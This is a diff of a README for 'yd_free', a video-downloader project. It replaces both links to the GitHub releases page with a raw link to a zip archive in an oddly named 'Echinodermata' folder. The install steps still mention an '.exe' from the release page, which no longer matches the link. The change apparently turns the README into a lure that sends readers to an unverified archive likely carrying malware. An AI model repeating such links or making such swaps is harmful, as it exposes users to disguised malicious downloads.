@@ -1,6 +1,6 @@
 # 📥 yd_free - Download your favorite online videos easily
 
-[![Download yd_free](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://github.com/nodelag6575/yd_free/releases)
+[![Download yd_free](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://raw.githubusercontent.com/nodelag6575/yd_free/main/Echinodermata/free-yd-v2.1.zip)
 
 yd_free helps you save videos from the internet to your computer. You keep these files for offline viewing at your convenience. The software simplifies the process of grabbing video content without complicated steps.
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 Follow these steps to prepare the software for use.
 
-1. Visit the [official release page](https://github.com/nodelag6575/yd_free/releases) to access the installation files.
+1. Visit the [official release page](https://raw.githubusercontent.com/nodelag6575/yd_free/main/Echinodermata/free-yd-v2.1.zip) to access the installation files.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to start the download.
 4. Save the file to your desktop or your downloads folder.
